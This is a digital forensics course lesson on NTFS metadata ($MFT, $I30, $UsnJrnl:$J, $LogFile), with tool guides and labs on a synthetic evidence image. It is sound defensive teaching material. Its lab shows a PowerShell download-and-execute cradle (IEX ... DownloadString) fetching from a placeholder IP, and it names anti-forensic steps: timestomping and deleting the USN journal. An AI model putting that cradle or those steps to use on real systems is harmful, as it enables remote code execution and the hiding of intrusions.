# Day 10: NTFS Deep Dive: $MFT, $UsnJrnl:$J, $LogFile and $I30

> **Phase 2: Windows Forensics** · **Level:** 🟡 Intermediate · **Time:** ~4 hours (reading + labs) · **Posted:** 2026-10-07
>
> **Tools today:** 🛠️ MFTECmd · 🛠️ NTFS Log Tracker · 🛠️ analyzeMFT

---

## 🎯 Learning objectives

By the end of today you will be able to:

1. Name NTFS's metadata files and explain how the **$MFT**, **FILE records** and **attributes** describe every file on the volume.
2. Decode a FILE record by hand: header, fixups, `$STANDARD_INFORMATION`, `$FILE_NAME`, `$DATA` (resident data and data runs).
3. Read the **eight timestamps** of a file, explain what updates each one, and spot **timestomping** and its limits.
4. Explain what happens to the $MFT and directory indexes (**$I30**) when a file is deleted or its record is **reused**, and recover names from **index slack**.
5. Parse the change journal (**$UsnJrnl:$J**) and the transaction log (**$LogFile**), and say what each can prove when the $MFT has nothing left.
6. Use **MFTECmd**, **analyzeMFT** and **NTFS Log Tracker**, and **validate** their output against a second tool.

---

## Part 1: The lesson

Day 4 introduced NTFS. Day 9 collected its metadata files. Today you open them up. NTFS keeps four overlapping records of file activity, and an investigator who can read all four can often reconstruct events after the files themselves are gone:

| Artifact | What it is | What it remembers | How far back |
|---|---|---|---|
| **$MFT** | One FILE record per file and directory | Current names, sizes, 8 timestamps, where the data is; deleted records until they're reused | The volume's whole life (current state only) |
| **$I30** | The index (B-tree) of each directory | Name, size and timestamps of each entry; old entries in **slack** | Until the index node is rewritten |
| **$UsnJrnl:$J** | The change journal | *What happened*: create, delete, rename, write, attribute change, with a timestamp | Days to weeks (size-limited) |
| **$LogFile** | The transaction log | *How the metadata changed* (redo/undo operations) | Minutes to hours (a few tens of MB, circular) |

### 1.1 Everything is a file

An NTFS volume starts with the boot sector (`$Boot`). Its BIOS Parameter Block gives bytes per sector, sectors per cluster, the cluster where the **$MFT** starts, and the FILE record size (almost always 1,024 bytes). Everything else, metadata included, is a file with an MFT entry:

| Entry | Name | Purpose |
|---:|---|---|
| 0 | `$MFT` | The Master File Table itself |
| 1 | `$MFTMirr` | Copy of the first four $MFT records |
| 2 | `$LogFile` | Transaction log (§1.7) |
| 3 | `$Volume` | Volume name, NTFS version, "dirty" flag |
| 4 | `$AttrDef` | Attribute definitions |
| 5 | `.` | Root directory |
| 6 | `$Bitmap` | Which clusters are in use |
| 7 | `$Boot` | Boot sector and boot code |
| 8 | `$BadClus` | Bad clusters (a sparse `$Bad` stream as big as the volume) |
| 9 | `$Secure` | Security descriptors (`$SDS` stream, `$SDH`/`$SII` indexes) |
| 10 | `$UpCase` | Upper-case table for case-insensitive names |
| 11 | `$Extend` | Folder holding `$ObjId`, `$Quota`, `$Reparse`, **`$UsnJrnl`**, `$RmMetadata` |
| 12–23 | (reserved) | Kept for NTFS's own use; `$Extend`'s files and ordinary files get later entries |

A **file reference** is 64 bits: a 48-bit **entry number** and a 16-bit **sequence number**. Tools write it as `entry-seq` (for example `73-2`). The sequence number goes up each time the entry is freed, so a reference to `73-1` that now points at `73-2` belonged to a **different, earlier file**.

### 1.2 Inside a FILE record

```
offset  field                        example (entry 114 in the lab)
0x00    signature "FILE"             46 49 4C 45   ("BAAD" = failed fixup)
0x04    update sequence array offset 0x0030, count 3 (1 USN + 2 sectors)
0x08    $LogFile sequence number     LSN of the last change (links the record to $LogFile)
0x10    sequence number              1
0x12    hard link count              1
0x14    offset of first attribute    0x38
0x16    flags                        0x0001 in use, 0x0002 directory
0x18    used / allocated size        584 / 1024
0x20    base record reference        0 unless this is an extension record
0x28    next attribute id; 0x2C: this record's own number (0x72 = 114)
0x38    attributes ... then 0xFFFFFFFF end marker
```

**Fixups.** Before writing a record, NTFS copies the last two bytes of each 512-byte sector into the update sequence array and writes a counter (the USN) there instead. A reader must check the counter and put the original bytes back. If a sector was half-written, the check fails. Hand-parsers that skip this step read two wrong bytes per sector.

**Attributes** (type code, then content):

| Type | Attribute | Forensic value |
|---|---|---|
| 0x10 | `$STANDARD_INFORMATION` ($SI) | 4 timestamps, DOS attributes, security ID, **USN of the last change** |
| 0x20 | `$ATTRIBUTE_LIST` | The record overflowed into extension records (fragmented or heavily-linked files) |
| 0x30 | `$FILE_NAME` ($FN) | Name, **parent reference**, its own 4 timestamps, sizes. One per name (Win32, DOS 8.3, hard links) |
| 0x40 | `$OBJECT_ID` | Object ID (links to LNK and Jump List tracking, Day 13) |
| 0x80 | `$DATA` | The content. Unnamed = the file; **named = an alternate data stream (ADS)**, e.g. `Zone.Identifier` |
| 0x90/0xA0/0xB0 | `$INDEX_ROOT` / `$INDEX_ALLOCATION` / `$BITMAP` | A directory's `$I30` index (§1.5) |
| 0xC0 | `$REPARSE_POINT` | Symlinks, junctions, cloud placeholders |
| 0x100 | `$LOGGED_UTILITY_STREAM` | EFS and TxF data |

**Resident or non-resident.** Small content lives *inside* the 1 KB record (resident). Files of up to roughly 700 bytes are stored entirely in the $MFT: scripts, small configs, `Zone.Identifier` streams. When a resident file is deleted, its content stays in the record until the record is reused. Bigger content is non-resident: the attribute holds **data runs** (start cluster and length, delta-encoded), and the clusters live elsewhere on the volume.

### 1.3 Eight timestamps (and what changes them)

Each file has **MACB** times in `$SI` *and* in `$FN`: **M**odified (content), **A**ccessed, **C**hanged (the MFT record itself; Windows calls it "change time"), **B**orn (created). Each is a FILETIME: 100-ns ticks since 1601-01-01 UTC.

| | `$STANDARD_INFORMATION` | `$FILE_NAME` |
|---|---|---|
| Updated by | Normal activity: writes, attribute changes, (sometimes) access | Creation, and **rename/move** (Windows copies the $SI times into $FN) |
| Shown by Explorer / `dir` | Yes | No |
| Can a user-mode program set it? | **Yes**: `SetFileTime`, PowerShell `.LastWriteTime`, `NtSetInformationFile` (all four) | Not directly, only through tricks such as moving the file after stomping $SI |

Last-access times are often not updated (Windows can disable or delay them; see `fsutil behavior query disablelastaccess`), so don't hang conclusions on A.

**Timestomping** (MITRE ATT&CK T1070.006) is backdating a file so it blends in. Ways to catch it:

| Check | Why it works | Weakness |
|---|---|---|
| `$SI` created **earlier** than `$FN` created (MFTECmd's `SI<FN` column) | Simple tools change only $SI | Tools that also fix $FN (rename/move trick) defeat it |
| Sub-second part is zero (`uSecZeros`) | Real timestamps almost never fall on a whole second; stomping tools often set whole seconds | Some tools copy times from another file, fractions included |
| `$SI` record-changed time (C) is much later than M/B | Setting times *changes the record* | `NtSetInformationFile` can set C too |
| Entry number / sequence doesn't fit the claimed age | Old files tend to have low entry numbers near their siblings | Entries are reused (lab: a "2019" file in a record freed yesterday) |
| `$UsnJrnl` has `BasicInfoChange` at the real time | The journal records the time change itself | The journal may have rolled over or been deleted |
| `$LogFile` shows an `UpdateResidentValue` on `$SI` | The log records the old and new values | Short retention |

No single check proves timestomping. Two or three independent ones do.

### 1.4 Delete, reuse, and why the other journals matter

When a file is deleted, NTFS:

1. clears the **in-use flag** and **increments the sequence number** in its FILE record (the content of the record stays);
2. marks its clusters free in `$Bitmap` (the data stays until overwritten);
3. removes the entry from the parent's `$I30` index (the bytes often stay in **slack**);
4. logs the operations in `$LogFile` and adds `FileDelete|Close` to `$UsnJrnl`.

So a deleted file is visible in the $MFT (name, parent, times, resident content) **until its record is reused**. NTFS reuses free records quickly. Once that happens, the old file's metadata is gone from the $MFT, and only the index slack, the change journal or the log can still name it. You'll see exactly this in the lab: a deleted `notes.txt` whose record now holds `svchost.exe`.

### 1.5 $I30: directory indexes

A directory's entries are kept in a B-tree called `$I30`:

- **`$INDEX_ROOT`** (resident, in the directory's FILE record) holds small directories entirely.
- **`$INDEX_ALLOCATION`** holds the rest in 4 KB **INDX** records (signature `INDX`) outside the $MFT, with a `$BITMAP` of which ones are in use.
- Each index entry holds the child's file reference and a **copy of its `$FILE_NAME`**: name, parent, four timestamps and sizes.

When entries are removed or the tree is rebalanced, the remaining entries are moved and the **old bytes remain after the end of the valid data** (slack). Parsing slack can reveal names (and $FN times) of files that were deleted long ago, even after their MFT records were reused. Expect duplicates too: slack also holds stale copies of entries that were just moved. Always compare slack hits with the live listing.

### 1.6 $UsnJrnl:$J: the change journal

`$Extend\$UsnJrnl` has two streams: **`$Max`** (settings) and **`$J`** (the records). `$J` is **sparse**: as it grows, Windows deallocates the oldest part, so a collected `$J` often starts with gigabytes of zeros followed by a few MB of records. Collect it with a tool that handles that (KAPE saves it as `$J`). Check a live volume's settings with `fsutil usn queryjournal C:`.

A `USN_RECORD_V2` (64-bit file references):

| Offset | Field | Notes |
|---|---|---|
| 0x00 | RecordLength (4), MajorVersion (2), MinorVersion (2) | 2 normally; 3 has 128-bit IDs (ReFS); **4 = range tracking** (no name) |
| 0x08 | FileReferenceNumber (8) | `entry-seq` of the file |
| 0x10 | ParentFileReferenceNumber (8) | `entry-seq` of the folder: rebuild paths with the $MFT |
| 0x18 | Usn (8) | The record's offset in `$J` |
| 0x20 | TimeStamp (8) | FILETIME, UTC |
| 0x28 | Reason (4) | What happened (below) |
| 0x2C | SourceInfo, SecurityId, FileAttributes | |
| 0x38 | FileNameLength (2), FileNameOffset (2), then the name (UTF-16) | |

Reason flags you will use constantly:

| Flag | Meaning |
|---|---|
| `FileCreate` / `FileDelete` | Created / deleted |
| `RenameOldName` + `RenameNewName` | A rename or **move** (two records: old name, then new name and new parent) |
| `DataOverwrite` / `DataExtend` / `DataTruncation` | Content changed |
| `NamedData*` / `StreamChange` | An alternate data stream changed (e.g. Zone.Identifier added) |
| `BasicInfoChange` | Attributes or **timestamps** changed: the footprint of timestomping |
| `SecurityChange`, `ObjectIdChange`, `HardLinkChange`, `ReparsePointChange` | As named |
| `Close` | The last handle was closed; the reasons on this record are the summary of the session |

Each file action produces several records (one per new reason, then a `Close` with the combined reasons). The journal answers "did this file ever exist, and what happened to it?", with a timestamp, even after the file and its MFT record are gone. Anti-forensics: `fsutil usn deletejournal` removes the journal; its absence on a system volume is itself suspicious.

### 1.7 $LogFile: the transaction log

NTFS writes every metadata change to `$LogFile` before making it, so it can redo or undo the change after a crash. It is circular and usually a few tens of MB.

```
0x0000  RSTR restart page 1 ─┐  current LSN, log page size, client "NTFS",
0x1000  RSTR restart page 2 ─┘  sequence-number bits (to turn an LSN into an offset)
0x2000+ RCRD log record pages:  page header + log records
        log record = LSN, previous LSN, undo-next LSN, transaction id, client data:
                     redo op + undo op + redo data + undo data + target (MFT record / index buffer)
```

What it can show, often when nothing else can: a file was **created** (`InitializeFileRecordSegment` + `AddIndexEntry…`), **deleted** (`DeallocateFileRecordSegment` + `DeleteIndexEntry…`), **renamed** (delete the old index entry, add the new one), **written** (`UpdateResidentValue` / `UpdateNonresidentValue`), and its **timestamps changed** (an update of the `$SI` value, with the old bytes in the undo data). Log records carry no timestamps of their own. Tools get times from the `$SI`/`$FN` bytes inside them or by matching with `$UsnJrnl`. A volume written by Linux's ntfs-3g has an **empty** $LogFile (all 0xFF), because ntfs-3g doesn't use it.

### 1.8 Getting the files out of an image

| File | The Sleuth Kit | Notes |
|---|---|---|
| `$MFT` | `icat image 0 > MFT` | Entry 0 |
| `$LogFile` | `icat image 2 > LogFile` | Entry 2 |
| `$Boot` | `icat image 7 > Boot` | Entry 7 |
| `$UsnJrnl:$J` | `ifind -n '$Extend/$UsnJrnl' image` gives the entry; then `istat` shows the `$J` stream's attribute id; `icat image <entry>-128-<id> > J` | Sparse: expect leading zeros |
| A directory's `$I30` | `istat image <dir>` then `icat image <dir>-160-<id> > I30` | Type 160 = `$INDEX_ALLOCATION` |

On a live Windows system the files are locked; use the triage tools from Day 9.

---

## Part 2: Tools

---

### 🛠️ Tool 1: MFTECmd

| | |
|---|---|
| **What** | Eric Zimmerman's command-line parser for **`$MFT`, `$J`, `$Boot`, `$SDS` and `$I30`** files. Output: CSV, JSON or bodyfile; plus record dumps and resident-data export |
| **Why in DFIR** | The standard $MFT/$J parser. Flags timestomping (`SI<FN`, `uSecZeros`), shows ADS and Zone.Identifier contents, resolves $J parent paths from a $MFT, reads locked files and shadow copies on a live system |
| **Platforms** | Windows (.NET 9 and .NET Framework 4.6.2 builds). The .NET 9 build also runs on Linux/macOS with the .NET runtime: in this lesson it was **built from source and run on Ubuntu 24.04** |
| **Licence** | MIT |
| **Home** | https://github.com/EricZimmerman/MFTECmd · downloads: https://ericzimmerman.github.io |

> **No `$LogFile` support:** the help lists `$MFT | $J | $Boot | $SDS | $I30`. That's why NTFS Log Tracker is today's second tool.

#### Requirements

- Windows 10/11 with the **.NET 9 runtime** (Day 1), or Linux/macOS with a .NET runtime.
- To build from source: the .NET SDK (Ubuntu 24.04 ships `dotnet-sdk-10.0`), Git, and access to `api.nuget.org`.

#### Installation

**Windows** (as on Day 1, with `Get-ZimmermanTools.ps1`):

```powershell
C:\Tools\ZimmermanTools\Get-ZimmermanTools.ps1 -Dest C:\Tools\ZimmermanTools -NetVersion 9
C:\Tools\ZimmermanTools\net9\MFTECmd.exe --version
```

**Linux (validated here): build from source.** The project targets .NET 9; Ubuntu 24.04's archive has the .NET 10 SDK, which can build it. `DOTNET_ROLL_FORWARD=Major` lets the .NET 9 build run on the .NET 10 runtime.

```bash
sudo apt update && sudo apt install -y dotnet-sdk-10.0 git
git clone -q --depth 1 https://github.com/EricZimmerman/MFTECmd.git ~/tools/MFTECmd-src
dotnet publish ~/tools/MFTECmd-src/MFTECmd/MFTECmd.csproj -c Release -f net9.0 -o ~/tools/MFTECmd -v quiet > /dev/null
echo 'mftecmd() { DOTNET_ROLL_FORWARD=Major ~/tools/MFTECmd/MFTECmd "$@"; }' >> ~/.bashrc
```

**Linux/macOS with the official build (not run here; the download site was unreachable from the lab).** Install a .NET 9 runtime from Microsoft (https://learn.microsoft.com/dotnet/core/install/), download the **.NET 9** `MFTECmd.zip` from https://ericzimmerman.github.io, unzip it, and run `dotnet MFTECmd.dll --help`.

#### Configuration: the options that matter

All from `MFTECmd --help` (version 2026.5.0):

| Option | Meaning |
|---|---|
| `-f FILE` | Input: `$MFT`, `$J`, `$Boot`, `$SDS` or `$I30` (type is detected from the content) |
| `-m MFT` | With a `$J`: use this `$MFT` to resolve parent paths |
| `--csv DIR` / `--csvf NAME` | CSV output folder / file name (`--json`/`--jsonf` likewise) |
| `--body DIR --bdl C` | Bodyfile for `mactime`, with the drive letter to prefix |
| `--de ENTRY[-SEQ]` | Dump every detail of one record; `--fls` lists a directory's contents |
| `--dr` | Dump resident files (including deleted ones still in their records) to `<csv dir>\Resident` |
| `--at` | Show all `$FN` times, not only those that differ from `$SI` |
| `--sn` | Include DOS 8.3 names |
| `--fl` | Condensed file listing |
| `--rs` | Recover FILE-record slack |
| `--vss`, `--dedupe` | Live system: also process shadow copies; de-duplicate by SHA-1 |
| `--ir --re .ps1,.bat --rm 1024` | Put resident data in the CSV/JSON (by extension, up to N bytes) |
| `--dt FORMAT` | Timestamp format (default `yyyy-MM-dd HH:mm:ss.fffffff`) |

Key CSV columns: `EntryNumber`, `SequenceNumber`, `InUse`, `ParentPath`, `FileName`, `IsAds`, `SI<FN`, `uSecZeros`, `Created0x10`/`0x30` (and Modified, RecordChange, Access), `UpdateSequenceNumber` (the $J USN in $SI), `LogfileSequenceNumber`, `ZoneIdContents`. A blank `0x30` column means "same as `0x10`" (use `--at` to always fill it).

#### Verify the installation

```bash
mftecmd --version          # 2026.5.0+<commit>
```

#### First use

```powershell
# Windows, elevated: the live $MFT and the $J collected by KAPE (Day 9)
MFTECmd.exe -f "C:\$MFT" --csv C:\Cases\WS-ALICE\mft --csvf mft.csv
MFTECmd.exe -f "E:\Cases\WS-ALICE\tout\C\$Extend\$J" -m "E:\Cases\WS-ALICE\tout\C\$MFT" --csv C:\Cases\WS-ALICE\mft --csvf j.csv
```

Open the CSVs in **Timeline Explorer** (Day 1), not Excel, which cuts the 100-ns precision.

#### Troubleshooting

| Symptom | Fix |
|---|---|
| `You must install or update .NET to run this application` | Install the .NET 9 runtime, or run with `DOTNET_ROLL_FORWARD=Major` on a newer runtime |
| `$J` results look short | **Check the count.** In this lab, version 2026.5.0 parsed 179 of 264 records from a journal that contains V4 (range-tracking) records: after each V4 record it skipped to the next 4 KB page. Cross-check with a second parser (Lab 6) |
| `--de` stops with `OverflowException` in `SkSecurityDescriptor` | Seen on this lab's ntfs-3g-made image, where every file has its own `$SECURITY_DESCRIPTOR` attribute; the `$SI`/`$FN` part prints first. Use `--csv` or another parser for those records |
| Blank `ParentPath` in `$J` output | Pass the matching `$MFT` with `-m` |
| Paths with `$` mangled in PowerShell | Use quotes: `"C:\$MFT"` in cmd, `'C:\$MFT'` in PowerShell |
| Timestamps rounded | You opened the CSV in Excel. Use Timeline Explorer or keep `--dt` with `fffffff` |

---

### 🛠️ Tool 2: NTFS Log Tracker

| | |
|---|---|
| **What** | A free Windows GUI tool by Junghoon Oh (blueangel) that parses **`$LogFile`** and **`$UsnJrnl:$J`**, using the `$MFT` for full paths, and can carve USN records from other data (unallocated space, pagefile, memory dumps, shadow copies) |
| **Why in DFIR** | One of very few tools that turn `$LogFile` redo/undo records into readable events (create, delete, rename, move, data writes). Version 1.9 (2024) added pattern-based detection of timestamp manipulation in `$LogFile` and `$UsnJrnl` |
| **Platforms** | Windows (GUI) |
| **Licence** | Freeware (closed source) |
| **Home** | https://sites.google.com/site/forensicnote/ntfs-log-tracker |

> ⚠️ **Not run here.** NTFS Log Tracker is a Windows GUI program and its download site was not reachable from the lab, so nothing in this section was run. It is described from the author's page and published descriptions; check the page for the current version's requirements. In Lab 7 you decode a real Windows `$LogFile` on Linux with `scripts/logfile_peek.py` to see what this tool does for you.

#### Requirements

- Windows 10/11 analysis VM. Run it as Administrator if you point it at a live volume.
- The artifacts: `$LogFile`, `$J` and `$MFT` from the same volume and the same moment (a KAPE `FileSystem` collection, Day 9).

#### Installation (Windows)

1. Download the latest zip from the page above.
2. Record its hash, unblock it, and extract it:

   ```powershell
   $zip = '.\<the zip you downloaded>.zip'
   Get-FileHash $zip -Algorithm SHA256
   Unblock-File $zip
   Expand-Archive $zip -DestinationPath C:\Tools\NTFSLogTracker
   ```

3. Run the executable in that folder. There is no installer.

#### Configuration

- **Inputs:** load `$LogFile` and/or `$UsnJrnl:$J`. Add `$MFT` to get full paths instead of file names only.
- **Time zone:** results are shown in local time by default, and the zone is adjustable. **Set UTC** so your timeline matches MFTECmd and everything else.
- **Output:** choose an output folder; export results to CSV for Timeline Explorer.
- **Carving:** use the USN carving feature on unallocated space, `pagefile.sys`, memory images or shadow copies when `$J` has rolled over.

#### Verify the installation

The main window opens, and loading a known `$J` (for example the one from Lab 6, copied to Windows) gives the same events (creates, renames) that `usn_peek.py` shows.

#### First use

1. Collect `$MFT`, `$LogFile` and `$Extend\$J` with KAPE (`--target FileSystem`).
2. Load the three files, set the time zone to UTC, and parse.
3. Filter for events around your incident time: file creation, deletion and rename events in `$LogFile` cover the last minutes to hours; `$J` covers days.
4. Export to CSV and merge into your super-timeline (Day 21).

#### Troubleshooting

| Symptom | Fix |
|---|---|
| SmartScreen or antivirus blocks it | Check the hash you recorded, then unblock it in an isolated analysis VM |
| Only file names, no paths | Load the `$MFT` from the same collection |
| Times differ from MFTECmd by hours | Set the tool's time zone to UTC |
| `$LogFile` gives almost nothing | Expected: it covers a short window. A Linux-written volume has an empty log (all 0xFF) |
| `$J` is huge and mostly zeros | Normal: it's sparse. Collect it with KAPE rather than copying it by hand |

---

### 🛠️ Tool 3: analyzeMFT

| | |
|---|---|
| **What** | A Python $MFT parser (originally by David Kovar, now maintained by rowingdude) with CSV, JSON, XML, Excel, **SQLite**, bodyfile, TSK and log2timeline output |
| **Why in DFIR** | Cross-platform and scriptable. Its SQLite export has ready-made views (`deleted_files`, `alternate_data_streams`, `timeline_view`) that you can query with SQL. A good **second parser** to validate MFTECmd |
| **Platforms** | Any OS with Python 3.8+ |
| **Licence** | MIT |
| **Home** | https://github.com/rowingdude/analyzeMFT · https://pypi.org/project/analyzeMFT/ |

#### Requirements

Python 3.8 or newer and `pip`/`pipx`.

#### Installation

```bash
# Linux / SIFT / macOS (pipx keeps it in its own environment; Ubuntu 24.04 blocks plain pip --user)
sudo apt install -y pipx && pipx install analyzeMFT && pipx ensurepath
analyzemft --version
```

```powershell
# Windows (Python from python.org or winget install Python.Python.3.12)
py -m venv C:\Tools\analyzeMFT
C:\Tools\analyzeMFT\Scripts\pip install analyzeMFT
C:\Tools\analyzeMFT\Scripts\analyzemft.exe --version
```

#### Configuration

| Option | Meaning |
|---|---|
| `-f MFT -o OUT` | Input $MFT and output file (the help says `-o -` means stdout, but 3.1.1 wrote a file named `-`) |
| `--csv` (default), `--json`, `--xml`, `--excel`, `--sqlite` | Output format |
| `--body`, `--tsk`, `--l2t`, `--timeline` | Timeline formats |
| `--hash` | MD5, SHA-256, SHA-512 and CRC32 of resident data |
| `--profile default\|quick\|forensic\|performance` | Analysis profiles (`--list-profiles`) |
| `-c FILE` / `--create-config FILE` | JSON/YAML configuration (filters such as `include_deleted`, `date_filter_start`) |
| `--chunk-size N` | Records per processing chunk (memory use on big MFTs) |
| `-V`, `-D` | Verbose / debug |

#### Verify the installation

```bash
analyzemft --version                                    # analyzemft 3.1.1
analyzemft --generate-test-mft /tmp/t.mft --test-records 100
analyzemft -f /tmp/t.mft -o /tmp/t.csv --csv 2> /dev/null && head -c 80 /tmp/t.csv   # Record Number,Record Status,...
```

#### First use

```bash
analyzemft -f MFT -o mft.csv --csv       # times for every record ($SI and $FN), record status
analyzemft -f MFT -o mft.db --sqlite     # full paths, deleted flag, ADS table, views
```

#### Troubleshooting (found while testing version 3.1.1 for this lesson)

| Symptom | Fix |
|---|---|
| The `Filepath` column is empty in CSV (and `filepath` is null in JSON) | The final CSV/JSON writer doesn't fill it in 3.1.1. Take paths from the `--sqlite` output (`mft_records.filepath`) and join on the record number (Lab 5) |
| SQLite times are all NULL | Same version: the SQLite export has paths but no times. Use CSV/JSON for times |
| Times end in `.437Z` | It keeps **milliseconds only**. Use MFTECmd for 100-ns precision (and for `uSecZeros`-style checks) |
| `--body` output has bare names, not paths | Use MFTECmd's `--body` for mactime timelines |
| `-o -` creates a file called `-` | Give a real output file name |
| `pip install` refused (externally-managed environment) | Use `pipx` or a virtual environment |

These are exactly why you **never rely on one parser**: compare counts and a few records against a second tool.

---

## Part 3: Hands-on labs

You'll analyse **case10.img**, a 32 MB NTFS volume built by `scripts/mk_ntfs_case10.sh`. The script uses `faketime` to freeze the clock for each step, so your image is identical to the one used here: same hash, same timestamps. The story: on the night of 2026-09-28/29, someone on alice's workstation downloaded `payload.ps1`, renamed a spreadsheet, deleted ten project files and a notes file, dropped `svchost.exe` in Temp and **timestomped** it and the payload. Then you'll read a **real Windows** `$J` and `$LogFile` from the dfir_ntfs project's public test data.

Run on Ubuntu 24.04 or SIFT with `sudo`. (On other distros, install a .NET 9+ SDK from Microsoft for the MFTECmd build.)

```bash
sudo apt update && sudo apt install -y ntfs-3g faketime sleuthkit pipx git curl dotnet-sdk-10.0
pipx install analyzeMFT && pipx ensurepath && export PATH="$HOME/.local/bin:$PATH"
git -C ~/DFIR pull 2>/dev/null || git clone https://github.com/Mr-Phoenix07/DFIR.git ~/DFIR
mkdir -p ~/cases/LAB-010/{evidence,work,notes,samples} ~/tools && cd ~/cases/LAB-010
export TZ=UTC
```

Build MFTECmd (about a minute) and check both parsers:

```bash
git clone -q --depth 1 https://github.com/EricZimmerman/MFTECmd.git ~/tools/MFTECmd-src
git -C ~/tools/MFTECmd-src log -1 --format='MFTECmd source %h %cs'
DOTNET_CLI_TELEMETRY_OPTOUT=1 DOTNET_NOLOGO=1 dotnet publish ~/tools/MFTECmd-src/MFTECmd/MFTECmd.csproj -c Release -f net9.0 -o ~/tools/MFTECmd -v quiet > /dev/null
mftecmd() { DOTNET_ROLL_FORWARD=Major ~/tools/MFTECmd/MFTECmd "$@"; }
mftecmd --version
analyzemft --version
```

```
MFTECmd source 6aadd87 2026-05-10
2026.5.0+6aadd87ae0526efca95dd5a59e62e186806cd4c8
analyzemft 3.1.1
```

(A newer MFTECmd commit is fine; record the version in your notes.)

### Lab 1: Build the evidence and pull out the metadata files (15 min)

```bash
cd ~/cases/LAB-010
sudo bash ~/DFIR/scripts/mk_ntfs_case10.sh evidence/case10.img
sha256sum evidence/case10.img | tee notes/case10.img.sha256
fsstat evidence/case10.img | grep -E '^(Volume Name|Version|First Cluster of MFT|Cluster Size|Range)'
fls -r -p evidence/case10.img | grep -v -E '\$|spec-(0[2-9]|2[1-9]|3[0-9])'
```

```
built evidence/case10.img
fec841897e7cc3ccc511dede0b0b8d8688911200a7efeebf2f6f48473def23d6  evidence/case10.img
Volume Name: CASE10
Version: Windows XP
First Cluster of MFT: 4
Range: 0 - 115
Cluster Size: 4096
d/d 64-144-2:	Users
d/d 65-144-2:	Users/alice
d/d 69-144-2:	Users/alice/AppData
d/d 70-144-2:	Users/alice/AppData/Local
d/d 71-144-2:	Users/alice/AppData/Local/Temp
r/r 73-128-2:	Users/alice/AppData/Local/Temp/svchost.exe
d/d 66-144-2:	Users/alice/Documents
d/d 67-144-2:	Users/alice/Documents/Projects
r/r 93-128-2:	Users/alice/Documents/Projects/spec-20.txt
r/r 74-128-2:	Users/alice/Documents/Projects/spec-01.txt
r/r 113-128-2:	Users/alice/Documents/Projects/spec-40.txt
-/r * 83-128-2:	Users/alice/Documents/Projects/spec-10.txt
-/r * 84-128-2:	Users/alice/Documents/Projects/spec-11.txt
-/r * 85-128-2:	Users/alice/Documents/Projects/spec-12.txt
-/r * 86-128-2:	Users/alice/Documents/Projects/spec-13.txt
-/r * 87-128-2:	Users/alice/Documents/Projects/spec-14.txt
-/r * 88-128-2:	Users/alice/Documents/Projects/spec-15.txt
-/r * 89-128-2:	Users/alice/Documents/Projects/spec-16.txt
-/r * 90-128-2:	Users/alice/Documents/Projects/spec-17.txt
-/r * 91-128-2:	Users/alice/Documents/Projects/spec-18.txt
-/r * 92-128-2:	Users/alice/Documents/Projects/spec-19.txt
r/r 72-128-2:	Users/alice/Documents/Q3-forecast.xlsx
d/d 68-144-2:	Users/alice/Downloads
r/r 114-128-2:	Users/alice/Downloads/payload.ps1
r/r 114-128-4:	Users/alice/Downloads/payload.ps1:Zone.Identifier
```

If your hash differs, your ntfs-3g version probably differs (this one: `2022.10.3`, Ubuntu 24.04). The analysis still works; only hashes change. Things to notice already: deleted entries (`*`), an ADS (`114-128-4`), and `spec-20.txt` listed first because it sits in the directory's **index root**, not in the INDX block (that matters in Lab 4). `notes.txt` is not listed at all.

Now extract the metadata files:

```bash
icat evidence/case10.img 0 > work/MFT
icat evidence/case10.img 2 > work/LogFile
sha256sum work/MFT
head -c 16 work/LogFile | xxd
```

```
2cd5a32aa1f619a0ece4899d4f229419450b9ca5c4b948ac798c4c9206026f2f  work/MFT
00000000: ffff ffff ffff ffff ffff ffff ffff ffff  ................
```

The `$LogFile` is all `0xFF`: ntfs-3g empties it and doesn't journal. A Windows-written volume would have a full log (Lab 7).

### Lab 2: Read FILE records by hand (20 min)

`scripts/mft_record.py` decodes one record field by field, so you can see the structure from §1.2:

```bash
python3 ~/DFIR/scripts/mft_record.py work/MFT 114 --hex
```

```
  0000: 46 49 4c 45 30 00 03 00 00 00 00 00 00 00 00 00
  0010: 01 00 01 00 38 00 01 00 48 02 00 00 00 04 00 00
  0020: 00 00 00 00 00 00 00 00 05 00 00 00 72 00 00 00
  0030: 0d 00 72 61 00 00 00 00 10 00 00 00 48 00 00 00
FILE record 114
  $LogFile sequence number (LSN): 0
  Sequence number               : 1   (bumped each time the record is reused)
  Hard link count               : 1
  Flags                         : 0x0001 = IN USE
  Used / allocated size         : 584 / 1024 bytes
  Base record                   : 0
  Fixups                        : 2 sectors, USN 0d00, OK
  Attribute $STANDARD_INFORMATION (type 0x10, id 0, resident, 72 bytes at offset 0x38)
      $SI Created        : 2026-09-29 01:02:03.1180043
      $SI Modified       : 2019-03-14 10:00:00.0000000
      $SI Record changed : 2026-09-29 01:20:44.9031551
      $SI Accessed       : 2019-03-14 10:00:00.0000000
      File attributes : Archive
  Attribute $FILE_NAME (type 0x30, id 3, resident, 112 bytes at offset 0x80)
      Name            : payload.ps1   (namespace POSIX)
      Parent          : entry 68, sequence 1
      $FN Created        : 2026-09-29 01:02:03.1180043
      $FN Modified       : 2026-09-29 01:02:03.1180043
      $FN Record changed : 2026-09-29 01:02:03.1180043
      $FN Accessed       : 2026-09-29 01:02:03.1180043
      Sizes in $FN    : allocated 80, real 0 (often stale: only updated on rename/move)
  Attribute $SECURITY_DESCRIPTOR (type 0x50, id 1, resident, 104 bytes at offset 0xf0)
  Attribute $DATA (type 0x80, id 2, resident, 104 bytes at offset 0x158)
      Resident data   : 75 bytes: b'IEX (New-Object Net.WebClient).DownloadString("http://203.0.113.' ...
  Attribute $DATA:Zone.Identifier (type 0x80, id 4, resident, 128 bytes at offset 0x1c0)
      Resident data   : 67 bytes: b'[ZoneTransfer]\r\nZoneId=3\r\nHostUrl=http://203.0.113.50/payload.ps' ...
  End-of-attributes marker at offset 0x240
```

Match the hex to the fields: `46 49 4c 45` = `FILE`; `30 00` = USA at 0x30; `01 00` at 0x10 = sequence 1; `01 00` at 0x16 = in use; `48 02` = 584 bytes used; `72 00 00 00` at 0x2C = record 114; `0d 00` at 0x30 = the USN that replaced the last two bytes of each sector.

Reading it as an examiner:

- The script is **resident**: its whole content is in the $MFT, and so is the **`Zone.Identifier`** stream that records where it came from (`ZoneId=3` = Internet).
- `$SI` says the file was last modified in **2019**, but it was **created** (both `$SI` and `$FN`) at 2026-09-29 01:02:03, and `$SI` record-changed is 01:20:44. A file can't be modified seven years before it was created. **Backdated.**
- `$FN` real size 0: `$FN` sizes are a snapshot from creation and are rarely updated. Trust `$DATA` for size.
